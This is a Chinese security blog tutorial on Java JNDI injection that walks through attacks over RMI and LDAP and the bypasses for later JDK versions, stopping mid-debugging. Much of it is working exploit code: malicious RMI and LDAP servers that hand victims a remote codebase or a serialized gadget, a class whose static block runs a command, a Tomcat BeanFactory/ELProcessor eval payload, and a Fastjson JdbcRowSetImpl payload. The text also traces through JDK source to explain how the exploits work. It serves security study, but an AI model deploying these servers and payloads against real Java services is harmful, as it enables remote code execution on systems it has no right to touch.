## JNDI

Java命名与目录结构，类比成一个字典，JDK默认包含以下几种:

* 轻量级目录访问协议(LDAP) (并不是Java特有的东西，计算机域也有)
* 通用对象请求代理架构(CORBA)通用对象服务(COS)名称服务
* Java远程方法调用(RMI)注册表
* 域名服务(DNS)

JNDI注入算是一个很好用的洞，不需要依赖组件，JDK本身就能用

### RMI

#### RMI的写法回顾:

创建一个`RMIServer`

```java
public class RMIServer {
    public static void main(String[] args) throws RemoteException, AlreadyBoundException, MalformedURLException, NamingException {
        // 实例化远程对象
        RemoteObj remoteObj = new RemoteObjImpl();//这一步已经开了端口，但是客户端并不知道，所以借助注册中心
        // 创建注册中心
        Registry registry = LocateRegistry.createRegistry(1099);
        // 绑定对象示例到注册中心
        registry.bind("remoteObj", remoteObj);
    }
}
```

客户端调用`RMIClient`

```java
public class RMIClient {
    public static  void  main(String[] args) throws Exception {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
        RemoteObj remoteObj = (RemoteObj) registry.lookup("remoteObj");
        remoteObj.sayHello("hello");
    }
}
```

具体对象逻辑

```java
public interface RemoteObj extends Remote {
    public String sayHello(String keywords) throws RemoteException;
}
```

```java
public class RemoteObjImpl extends UnicastRemoteObject implements RemoteObj{
    public RemoteObjImpl() throws RemoteException {
            //UnicastRemoteObject.exportObject(this, 0); // 如果不能继承 UnicastRemoteObject 就需要手工导出
    }
    @Override
    public String sayHello(String keywords) throws RemoteException {
        String upKeywords = keywords.toUpperCase();
        System.out.println(upKeywords);
        return upKeywords;
    }
}
```

#### 与JNDI结合:

创建初始上下文，`InitialContext`

```JAVA
public class RMIServer {
    public static void main(String[] args) throws RemoteException, AlreadyBoundException, MalformedURLException, NamingException {
        InitialContext initialContext = new InitialContext();
        // 实例化远程对象
        RemoteObj remoteObj = new RemoteObjImpl();//这一步已经开了端口，但是客户端并不知道，所以借助注册中心
        // 创建注册中心
        Registry registry = LocateRegistry.createRegistry(1099);
        // 绑定对象示例到注册中心
        initialContext.rebind("rmi://localhost:1099/remoteObj",new RemoteObjImpl());
        //registry.bind("remoteObj", remoteObj);
    }
}
```

调用
```java
public class RMIClient {
    public static  void  main(String[] args) throws Exception {
        InitialContext initialContext = new InitialContext();
        RemoteObj remoteObj = (RemoteObj)initialContext.lookup("rmi://localhost:1099/remoteOBj");
        //Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
        //RemoteObj remoteObj = (RemoteObj) registry.lookup("remoteObj");
        remoteObj.sayHello("hello");
    }
}
```

因为建立在rmi之上，所以之前攻击RMI的方式也是可行的。

### 通过绑定引用对象攻击

https://docs.oracle.com/javase/jndi/tutorial/objects/storing/reference.html

绑定到引用对象
```java
public class RMIServer {
    public static void main(String[] args) throws RemoteException, AlreadyBoundException, MalformedURLException, NamingException {
        InitialContext initialContext = new InitialContext();
        Registry registry = LocateRegistry.createRegistry(1099);
        //绑定引用
        Reference refObj = new Reference("TestRef","TestRef","http://localhost:8000");//开一个恶意服务器
        initialContext.rebind("rmi://localhost:1099/remoteObj",refObj);
    }
}
```

可以看看Reference类

```java
public Reference(String className, String factory, String factoryLocation) {
    this(className);
    classFactory = factory;
    classFactoryLocation = factoryLocation;
}
```

写一个恶意类编译好，开个http服务用来攻击,注意与前面绑定的`Reference`名称参数保持一致

```java
import java.io.IOException;
public class TestRef {
    static{
        try {
            Runtime.getRuntime().exec("gnome-calculator");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
```

查找引用对象

```java
public class RMIClient {
    public static  void  main(String[] args) throws Exception {
        InitialContext initialContext = new InitialContext();
        RemoteObj remoteObj = (RemoteObj)initialContext.lookup("rmi://localhost:1099/remoteOBj");
        remoteObj.sayHello("hello");
    }
}
```

查询时会触发攻击。

由此看见如果绑定地址可以控制，那么就可能造成漏洞。这里引出我当时的一个思考，`Reference`这个类是跟LDAP有关的，但是在访问时代码写的都是rmi开头的协议，经过调试发现，这其实是一个线性的关系，先通过RMI获取到`Reference`,(因为RMI绑定的就是Reference嘛)，然后在`decodeObject`时执行`Reference`的相关逻辑。这里附一张Nep的stoocea师傅帮我画的流程图

![Untitled Diagram.drawio](/home/mozhu/blog/Web/Java/JNDI/Untitled Diagram.drawio.png)

#### 调试跟进分析

从调用`lookup`开始，进入

```java
public Object lookup(String var1) throws NamingException {
    ResolveResult var2 = this.getRootURLContext(var1, this.myEnv);
    Context var3 = (Context)var2.getResolvedObj();
    Object var4;
    try {
🔴         var4 = var3.lookup(var2.getRemainingName());
    } finally {
        var3.close();
    }
    return var4;
}
```

跟进看看`lookup`，这里var2其实已经获取到`Reference`了

```java
public Object lookup(Name var1) throws NamingException {
    if (var1.isEmpty()) {
        return new RegistryContext(this);
    } else {
        Remote var2;
        try {
            var2 = this.registry.lookup(var1.get(0));
        } catch (NotBoundException var4) {
            throw new NameNotFoundException(var1.get(0));
        } catch (RemoteException var5) {
            throw (NamingException)wrapRemoteException(var5).fillInStackTrace();
        }
🔴        return this.decodeObject(var2, var1.getPrefix(1));
    }
}
```

这里`decodeObject`看起来是关键逻辑，进去看看。进入到了`RegistryContext`。会调用`NamingManager`的静态方法。所以尽管是RMI的Context，但是进入`NamingManager`后也跟RMI无关了，触发恶意代码就是在`NamingManager`这里触发的

```java
private Object decodeObject(Remote var1, Name var2) throws NamingException {
    try {
        Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1;
🔴      return NamingManager.getObjectInstance(var3, var2, this, this.environment);
    } catch (NamingException var5) {
        throw var5;
    } catch (RemoteException var6) {
        throw (NamingException)wrapRemoteException(var6).fillInStackTrace();
    } catch (Exception var7) {
        NamingException var4 = new NamingException();
        var4.setRootCause(var7);
        throw var4;
    }
}
```

`getObjectInstance`中获取工厂`getObjectFactoryFromReference`是Reference的用法，同时会有类加载以及实例化的过程，下断点去调一下

```java
public static Object
    getObjectInstance(Object refInfo, Name name, Context nameCtx,
                      Hashtable<?,?> environment)
    throws Exception
{

    ObjectFactory factory;

    // Use builder if installed
    ObjectFactoryBuilder builder = getObjectFactoryBuilder();
    if (builder != null) {
        // builder must return non-null factory
        factory = builder.createObjectFactory(refInfo, environment);
        return factory.getObjectInstance(refInfo, name, nameCtx,
            environment);
    }

    // Use reference if possible
    Reference ref = null;
    if (refInfo instanceof Reference) {
        ref = (Reference) refInfo;
    } else if (refInfo instanceof Referenceable) {
        ref = ((Referenceable)(refInfo)).getReference();
    }

    Object answer;

    if (ref != null) {
        String f = ref.getFactoryClassName();
        if (f != null) {
            // if reference identifies a factory, use exclusively

🔴          factory = getObjectFactoryFromReference(ref, f);
            if (factory != null) {
                return factory.getObjectInstance(ref, name, nameCtx,
                                                 environment);
            }
            // No factory found, so return original refInfo.
            // Will reach this point if factory class is not in
            // class path and reference does not contain a URL for it
            return refInfo;

        } else {
            // if reference has no factory, check for addresses
            // containing URLs

            answer = processURLAddrs(ref, name, nameCtx, environment);
            if (answer != null) {
                return answer;
            }
        }
    }

    // try using any specified factories
    answer =
        createObjectFromFactories(refInfo, name, nameCtx, environment);
    return (answer != null) ? answer : refInfo;
}
```

走到一处静态方法，try语句中进行类的加载，首先会使用AppClassLoader本地找，找不到获取codebase（对应我们写的本地python开的服务器)调用URLClassLoader去找。同时在最后一句可以看到进行了类的实例化。

```java
    static ObjectFactory getObjectFactoryFromReference(
        Reference ref, String factoryName)
        throws IllegalAccessException,
        InstantiationException,
        MalformedURLException {
        Class<?> clas = null;

        // Try to use current class loader
        try {
             clas = helper.loadClass(factoryName);
        } catch (ClassNotFoundException e) {
            // ignore and continue
            // e.printStackTrace();
        }
        // All other exceptions are passed up.

        // Not in class path; try to use codebase
        String codebase;
        if (clas == null &&
                (codebase = ref.getFactoryClassLocation()) != null) {
            try {
                clas = helper.loadClass(factoryName, codebase);
            } catch (ClassNotFoundException e) {
            }
        }

        return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
    }

```

```java
public Class<?> loadClass(String className, String codebase)
        throws ClassNotFoundException, MalformedURLException {

    ClassLoader parent = getContextClassLoader();
    ClassLoader cl =
             URLClassLoader.newInstance(getUrlArray(codebase), parent);

    return loadClass(className, cl);
}
```

### JNDI+LDAP绕过

后续补丁在每个类型(RMI,CORBA...)对应的context中加入了限制(trustURLcodebase)，但是并没有对LDAP相应的加入限制，成为漏网之鱼。

JDK版本介于8u191、7u201、6u211与6u141、7u131、8u121之间

首先创建一个LDAP的服务,这里可以借助工具Apache Directory

https://directory.apache.org/

但是这个自己配置时好久没有弄好，后来看到小叮师傅的文章，索性直接在java项目里开一个LDAP服务，方便快捷,先导入maven依赖

```java
<dependency>  
 <groupId>com.unboundid</groupId>  
 <artifactId>unboundid-ldapsdk</artifactId>  
 <version>3.2.0</version>  
 <scope>test</scope>  <!--有这一行的话只能在测试中(绿色测试类)写-->
</dependency>
```

然后是LDAP的服务，里面一些参数比如攻击路径可以自行修改
```java
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
public class LDAPserver {
    private static final String LDAP_BASE = "dc=example,dc=com";
    public static void main (String[] args) {
        String url = "http://127.0.0.1:8000/#EvilObject";
        int port = 1234;
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port);
            ds.startListening();
        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }
    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        private URL codebase;
        /**
         * */ public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }
        /**
         * {@inheritDoc}
         * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)  
         */ @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }
        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "Exploit");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }
            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference");
            e.addAttribute("javaFactory", this.codebase.getRef());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
```

对应的受害者，也就是客户端,运行访问时触发计算器

```java
import javax.naming.InitialContext;  
public class JNDILdapClient {  
    public static void main(String[] args) throws Exception{  
        InitialContext initialContext = new InitialContext();  
 RemoteObj remoteObj = (RemoteObj) initialContext.lookup("ldap://localhost:1234/remoteObj");  
 System.out.println(remoteObj.sayHello("hello"));  
 }  
}
```

后面跟一开始的流程都是一样的。

### 8u191之后绕过之三打白骨精

##### 三打白骨精之三尖两刃枪法

现在LDAP这条路也加入了`trustURLCodebase`限制,一种绕过的思路是去在受害者本地去找是否有可能的工厂类，实现让受害者自己打自己

```java
private Object decodeObject(Remote var1, Name var2) throws NamingException {
    try {
        Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1;
        Reference var8 = null;
        if (var3 instanceof Reference) {
            var8 = (Reference)var3;
        } else if (var3 instanceof Referenceable) {
            var8 = ((Referenceable)((Referenceable)var3)).getReference();
        }

🔴      if (var8 != null && var8.getFactoryClassLocation() != null && !trustURLCodebase) {
            throw new ConfigurationException("The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.");
        } 
```

于是需要查找实现了`ObjectFactory`接口的类。这里找到了`org.apache.naming.factory.BeanFactory` 类，其满足上述条件并存在于 Tomcat8 依赖包中，应用广泛。该类的 `getObjectInstance()` 函数中会通过反射的方式实例化 Reference 所指向的任意 Bean Class(Bean Class 就类似于我们之前说的那个 CommonsBeanUtils 这种)，并且会调用 setter 方法为所有的属性赋值。而该 Bean Class 的类名、属性、属性值，全都来自于 Reference 对象，均是攻击者可控的。

Maven中导入依赖，注意高版本Tomcat可能会导致失败

```xml
  <dependencies>
          <dependency>
              <groupId>org.apache.tomcat</groupId>
              <artifactId>tomcat-catalina</artifactId>
              <version>8.5.31</version> <!-- Or a version that matches your needs -->
          </dependency>
      <dependency>
          <groupId>org.apache.tomcat.embed</groupId>
          <artifactId>tomcat-embed-el</artifactId>
          <version>8.5.31</version>
      </dependency>
      <dependency>
          <groupId>com.unboundid</groupId>
          <artifactId>unboundid-ldapsdk</artifactId>
          <version>4.0.5</version>
<!--          <scope>test</scope>-->
      </dependency>
  </dependencies>
```

**JNDIBypassHighJava**,windows系统自行修改`gnome-calculator`为`calc`

```JAVA
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
// JNDI 高版本 jdk 绕过服务端
public class JNDIBypassHighJava {
    public static void main(String[] args) throws Exception {
        System.out.println("[*]Evil RMI Server is Listening on port: 1099");
        Registry registry = LocateRegistry.createRegistry( 1099);
        // 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "",
                true,"org.apache.naming.factory.BeanFactory",null);
        // 强制将'x'属性的setter从'setX'变为'eval', 详细逻辑见BeanFactory.getObjectInstance代码
        ref.add(new StringRefAddr("forceString", "x=eval"));
        // 利用表达式执行命令
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
                ".newInstance().getEngineByName(\"JavaScript\")" +
                ".eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['gnome-calculator']).start()\")"));
        System.out.println("[*]Evil command: gnome-calculator");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("Object", referenceWrapper);
    }
}
```

受害者

```java
import javax.naming.Context;
import javax.naming.InitialContext;
public class JNDIBypassHighJavaClient {
    public static void main(String[] args) throws Exception {
        String uri = "rmi://localhost:1099/Object";
        Context context = new InitialContext();
        context.lookup(uri);
    }
}
```

运行后触发计算器。

##### 调试分析

首先说一嘴`public class ResourceRef extends Reference`这个类，可以理解为Tomcat对`Reference`的增强，从继承关系也不难看出。后面会用到。

把服务端跑起来后，还是从`lookup`出发

```java
public class JNDIBypassHighJavaClient {
    public static void main(String[] args) throws Exception {
        String uri = "rmi://localhost:1099/Object";
        Context context = new InitialContext();
🔴      context.lookup(uri);
    }
}
```

进入`lookup`后，在`decodeObject`这里断一下

```java
public Object lookup(Name var1) throws NamingException {
    if (var1.isEmpty()) {
        return new RegistryContext(this);
    } else {
        Remote var2;
        try {
            var2 = this.registry.lookup(var1.get(0));
        } catch (NotBoundException var4) {
            throw new NameNotFoundException(var1.get(0));
        } catch (RemoteException var5) {
            throw (NamingException)wrapRemoteException(var5).fillInStackTrace();
        }

🔴      return this.decodeObject(var2, var1.getPrefix(1));
    }
}
```

`decodeObject`，进入`getObjectInstance()`

```java
public static Object
    getObjectInstance(Object refInfo, Name name, Context nameCtx,
                      Hashtable<?,?> environment)
    throws Exception
{

    ObjectFactory factory;

    // Use builder if installed
    ObjectFactoryBuilder builder = getObjectFactoryBuilder();
    if (builder != null) {
        // builder must return non-null factory
        factory = builder.createObjectFactory(refInfo, environment);
        return factory.getObjectInstance(refInfo, name, nameCtx,
            environment);
    }

    // Use reference if possible
    Reference ref = null;
    if (refInfo instanceof Reference) {
        ref = (Reference) refInfo;
    } else if (refInfo instanceof Referenceable) {
        ref = ((Referenceable)(refInfo)).getReference();
    }

    Object answer;

    if (ref != null) {
        String f = ref.getFactoryClassName();
        if (f != null) {
            // if reference identifies a factory, use exclusively

🔴          factory = getObjectFactoryFromReference(ref, f);
            if (factory != null) {
🔴              return factory.getObjectInstance(ref, name, nameCtx,
                                                 environment);
            }
            // No factory found, so return original refInfo.
            // Will reach this point if factory class is not in
            // class path and reference does not contain a URL for it
            return refInfo;

        } else {
            // if reference has no factory, check for addresses
            // containing URLs

            answer = processURLAddrs(ref, name, nameCtx, environment);
            if (answer != null) {
                return answer;
            }
        }
    }

    // try using any specified factories
    answer =
        createObjectFromFactories(refInfo, name, nameCtx, environment);
    return (answer != null) ? answer : refInfo;
}

```

在``getObjectFactoryFromReference`中，需要把实例化的对象转换为`ObjectFactory`类型(下方代码的最后一行)，也就是说，我们传入的 Factory 类必须实现 ObjectFactory 接口类、而 `org.apache.naming.factory.BeanFactory` 正好满足这一点

```java
public static synchronized void setObjectFactoryBuilder(
        ObjectFactoryBuilder builder) throws NamingException {
    if (object_factory_builder != null)
        throw new IllegalStateException("ObjectFactoryBuilder already set");

    SecurityManager security = System.getSecurityManager();
    if (security != null) {
        security.checkSetFactory();
    }
    object_factory_builder = builder;
}

/**
 * Used for accessing object factory builder.
 */
static synchronized ObjectFactoryBuilder getObjectFactoryBuilder() {
    return object_factory_builder;
}


/**
 * Retrieves the ObjectFactory for the object identified by a reference,
 * using the reference's factory class name and factory codebase
 * to load in the factory's class.
 * @param ref The non-null reference to use.
 * @param factoryName The non-null class name of the factory.
 * @return The object factory for the object identified by ref; null
 * if unable to load the factory.
 */
static ObjectFactory getObjectFactoryFromReference(
    Reference ref, String factoryName)
    throws IllegalAccessException,
    InstantiationException,
    MalformedURLException {
    Class<?> clas = null;

    // Try to use current class loader
    try {
         clas = helper.loadClass(factoryName);
    } catch (ClassNotFoundException e) {
        // ignore and continue
        // e.printStackTrace();
    }
    // All other exceptions are passed up.

    // Not in class path; try to use codebase
    String codebase;
    if (clas == null &&
            (codebase = ref.getFactoryClassLocation()) != null) {
        try {
            clas = helper.loadClass(factoryName, codebase);
        } catch (ClassNotFoundException e) {
        }
    }

    return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
}
```

继续往下走，copy一下小叮师傅的讲解

跟进看到 `getObjectInstance()` 方法中，会判断 obj 参数是否是 `ResourceRef` 类实例，是的话代码才会往下走，这就是为什么我们在恶意 RMI 服务端中构造 Reference 类实例的时候必须要用 Reference 类的子类 ResourceRef 类来创建实例，继续，会注意到函数会查找 `forceString` 的内容中是否存在”=”号，不存在的话就调用属性的默认 setter 方法，存在的话就取键值、其中键是属性名而对应的值是其指定的 setter 方法。如此，之前设置的 `forceString` 的值就可以强制将 x 属性的 setter 方法转换为调用我们指定的 eval() 方法了，这是 `BeanFactory` 类能进行利用的关键点！之后，就是获取 beanClass 即 `javax.el.ELProcessor` 类的 eval() 方法并和 x 属性一同缓存到 forced 这个 HashMap 中

我的个人理解:这相当于设置一个工厂，配置了setter方法的原材料配方，也就是存的那些字符串。这里是那些rce命令，使用时照着这个实例化攻击类。

后面的while循环则是遍历Reference中的属性，将每个属性值通过反射自动注入到bean实例的对应setter方法上。如果之前有显式指定setter方法（比如攻击链里的setX=evilSetter），直接用反射调用它，触发攻击

```java
@Override
public Object getObjectInstance(Object obj, Name name, Context nameCtx,
                                Hashtable<?,?> environment)
    throws NamingException {
//判断逻辑
    if (obj instanceof ResourceRef) {

        try {

            Reference ref = (Reference) obj;
            String beanClassName = ref.getClassName();
            Class<?> beanClass = null;
            ClassLoader tcl =
                Thread.currentThread().getContextClassLoader();
            if (tcl != null) {
                try {
                    beanClass = tcl.loadClass(beanClassName);
                } catch(ClassNotFoundException e) {
                }
            } else {
                try {
                    beanClass = Class.forName(beanClassName);
                } catch(ClassNotFoundException e) {
                    e.printStackTrace();
                }
            }
            if (beanClass == null) {
                throw new NamingException
                    ("Class not found: " + beanClassName);
            }

            BeanInfo bi = Introspector.getBeanInfo(beanClass);
            PropertyDescriptor[] pda = bi.getPropertyDescriptors();

            Object bean = beanClass.getConstructor().newInstance();

            /* Look for properties with explicitly configured setter */
            RefAddr ra = ref.get("forceString");
            Map<String, Method> forced = new HashMap<>();
            String value;

            if (ra != null) {
                value = (String)ra.getContent();
                Class<?> paramTypes[] = new Class[1];
                paramTypes[0] = String.class;
                String setterName;
                int index;

                /* Items are given as comma separated list */
                for (String param: value.split(",")) {
                    param = param.trim();
                    /* A single item can either be of the form name=method
                     * or just a property name (and we will use a standard
                     * setter) */
                    
                    这里的关键逻辑
                    index = param.indexOf('=');
                    if (index >= 0) {
                        setterName = param.substring(index + 1).trim();
                        param = param.substring(0, index).trim();
                    } else {
                        setterName = "set" +
                                     param.substring(0, 1).toUpperCase(Locale.ENGLISH) +
                                     param.substring(1);
                    }
                    try {
                        forced.put(param,
                                   beanClass.getMethod(setterName, paramTypes));
                    } catch (NoSuchMethodException|SecurityException ex) {
                        throw new NamingException
                            ("Forced String setter " + setterName +
                             " not found for property " + param);
                    }
                }
            }

            Enumeration<RefAddr> e = ref.getAll();

            while (e.hasMoreElements()) {

                ra = e.nextElement();
                String propName = ra.getType();

                if (propName.equals(Constants.FACTORY) ||
                    propName.equals("scope") || propName.equals("auth") ||
                    propName.equals("forceString") ||
                    propName.equals("singleton")) {
                    continue;
                }

                value = (String)ra.getContent();

                Object[] valueArray = new Object[1];

                /* Shortcut for properties with explicitly configured setter */
                Method method = forced.get(propName);
                if (method != null) {
                    valueArray[0] = value;
                    try {
                        method.invoke(bean, valueArray);
                    } catch (IllegalAccessException|
                             IllegalArgumentException|
                             InvocationTargetException ex) {
                        throw new NamingException
                            ("Forced String setter " + method.getName() +
                             " threw exception for property " + propName);
                    }
                    continue;
                }

                int i = 0;
                for (i = 0; i<pda.length; i++) {

                    if (pda[i].getName().equals(propName)) {

                        Class<?> propType = pda[i].getPropertyType();

                        if (propType.equals(String.class)) {
                            valueArray[0] = value;
                        } else if (propType.equals(Character.class)
                                   || propType.equals(char.class)) {
                            valueArray[0] =
                                Character.valueOf(value.charAt(0));
                        } else if (propType.equals(Byte.class)
                                   || propType.equals(byte.class)) {
                            valueArray[0] = Byte.valueOf(value);
                        } else if (propType.equals(Short.class)
                                   || propType.equals(short.class)) {
                            valueArray[0] = Short.valueOf(value);
                        } else if (propType.equals(Integer.class)
                                   || propType.equals(int.class)) {
                            valueArray[0] = Integer.valueOf(value);
                        } else if (propType.equals(Long.class)
                                   || propType.equals(long.class)) {
                            valueArray[0] = Long.valueOf(value);
                        } else if (propType.equals(Float.class)
                                   || propType.equals(float.class)) {
                            valueArray[0] = Float.valueOf(value);
                        } else if (propType.equals(Double.class)
                                   || propType.equals(double.class)) {
                            valueArray[0] = Double.valueOf(value);
                        } else if (propType.equals(Boolean.class)
                                   || propType.equals(boolean.class)) {
                            valueArray[0] = Boolean.valueOf(value);
                        } else {
                            throw new NamingException
                                ("String conversion for property " + propName +
                                 " of type '" + propType.getName() +
                                 "' not available");
                        }

                        Method setProp = pda[i].getWriteMethod();
                        if (setProp != null) {
                            setProp.invoke(bean, valueArray);
                        } else {
                            throw new NamingException
                                ("Write not allowed for property: "
                                 + propName);
                        }

                        break;

                    }

                }

                if (i == pda.length) {
                    throw new NamingException
                        ("No set method found for property: " + propName);
                }

            }

            return bean;

        } catch (java.beans.IntrospectionException ie) {
            NamingException ne = new NamingException(ie.getMessage());
            ne.setRootCause(ie);
            throw ne;
        } catch (java.lang.ReflectiveOperationException e) {
            Throwable cause = e.getCause();
            if (cause instanceof ThreadDeath) {
                throw (ThreadDeath) cause;
            }
            if (cause instanceof VirtualMachineError) {
                throw (VirtualMachineError) cause;
            }
            NamingException ne = new NamingException(e.getMessage());
            ne.setRootCause(e);
            throw ne;
        }

    } else {
        return null;
    }

}
```

##### 三打白骨精之如意金箍棒法

利用 LDAP 返回序列化数据，触发本地 Gadget，这个方法要更好用一些，应用更为广泛。这里再次copy一下小叮的讲解。LDAP 服务端除了支持 JNDI Reference 这种利用方式外，还支持直接返回一个序列化的对象。如果 Java 对象的 javaSerializedData 属性值不为空，则客户端的 `obj.decodeObject()` 方法就会对这个字段的内容进行反序列化。此时，如果服务端 ClassPath 中存在反序列功能rce的 Gadget 如 CommonsCollections 库，那么就可以结合该 Gadget 实现反序列化漏洞攻击。

搭建环境，导入有rce漏洞的依赖,先用ysoserial生成个Payload,再搭建一个恶意的LDAP服务器

```xml
<dependency>  
 <groupId>com.alibaba</groupId>  
 <artifactId>fastjson</artifactId>  
 <version>1.2.80</version>  
</dependency>
<dependency>  
 <groupId>commons-collections</groupId>  
 <artifactId>commons-collections</artifactId>  
 <version>3.2.1</version>  
</dependency>
```

```java
import com.unboundid.util.Base64;  
import com.unboundid.ldap.listener.InMemoryDirectoryServer;  
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;  
import com.unboundid.ldap.listener.InMemoryListenerConfig;  
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;  
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;  
import com.unboundid.ldap.sdk.Entry;  
import com.unboundid.ldap.sdk.LDAPException;  
import com.unboundid.ldap.sdk.LDAPResult;  
import com.unboundid.ldap.sdk.ResultCode;  
  
import javax.net.ServerSocketFactory;  
import javax.net.SocketFactory;  
import javax.net.ssl.SSLSocketFactory;  
import java.net.InetAddress;  
import java.net.MalformedURLException;  
import java.net.URL;  
import java.text.ParseException;  
  
public class JNDIGadgetServer {  
  
    private static final String LDAP_BASE = "dc=example,dc=com";  
  
  
 public static void main (String[] args) {  
  
        String url = "http://vps:8000/#ExportObject";  
 int port = 1234;  
  
  
 try {  
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);  
 config.setListenerConfigs(new InMemoryListenerConfig(  
                    "listen",  
 InetAddress.getByName("0.0.0.0"),  
 port,  
 ServerSocketFactory.getDefault(),  
 SocketFactory.getDefault(),  
 (SSLSocketFactory) SSLSocketFactory.getDefault()));  
  
 config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));  
 InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);  
 System.out.println("Listening on 0.0.0.0:" + port);  
 ds.startListening();  
  
 }  
        catch ( Exception e ) {  
            e.printStackTrace();  
 }  
    }  
  
    private static class OperationInterceptor extends InMemoryOperationInterceptor {  
  
        private URL codebase;  
  
  
 /**  
 * */ public OperationInterceptor ( URL cb ) {  
            this.codebase = cb;  
 }  
  
  
        /**  
 * {@inheritDoc}  
 * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)  
 */ @Override  
 public void processSearchResult ( InMemoryInterceptedSearchResult result ) {  
            String base = result.getRequest().getBaseDN();  
 Entry e = new Entry(base);  
 try {  
                sendResult(result, base, e);  
 }  
            catch ( Exception e1 ) {  
                e1.printStackTrace();  
 }  
  
        }  
  
  
        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {  
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));  
 System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);  
 e.addAttribute("javaClassName", "Exploit");  
 String cbstring = this.codebase.toString();  
 int refPos = cbstring.indexOf('#');  
 if ( refPos > 0 ) {  
                cbstring = cbstring.substring(0, refPos);  
 }  
  
            // Payload1: 利用LDAP+Reference Factory  
//            e.addAttribute("javaCodeBase", cbstring);  
//            e.addAttribute("objectClass", "javaNamingReference");  
//            e.addAttribute("javaFactory", this.codebase.getRef());  
  
 // Payload2: 返回序列化Gadget  
 try {  
                e.addAttribute("javaSerializedData", Base64.decode("生成的payload"));  
 } catch (ParseException exception) {  
                exception.printStackTrace();  
 }  
  
            result.sendSearchEntry(e);  
 result.setResult(new LDAPResult(0, ResultCode.SUCCESS));  
 }  
  
    }  
}
```

##### 调试分析

依旧从`lookup`入手

```java
public class JNDIGadgetClient {
    public static void main(String[] args) throws Exception {
        // lookup参数注入触发
        Context context = new InitialContext();
🔴      context.lookup("ldap://localhost:1234/ExportObject");

        // Fastjson反序列化JNDI注入Gadget触发
        String payload ="{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1234/ExportObject\",\"autoCommit\":\"true\" }";
        JSON.parse(payload);
    }
}
```

这前期跟之前都是一样的

```java
public Object lookup(String var1) throws NamingException {
    ResolveResult var2 = this.getRootURLContext(var1, this.myEnv);
    Context var3 = (Context)var2.getResolvedObj();

    Object var4;
    try {
🔴      var4 = var3.lookup(var2.getRemainingName());
    } finally {
        var3.close();
    }

    return var4;
}
```

层层跟进好几个`lookup`，这里有个`p_lookup`

```java
public Object lookup(Name var1) throws NamingException {
    PartialCompositeContext var2 = this;
    Hashtable var3 = this.p_getEnvironment();
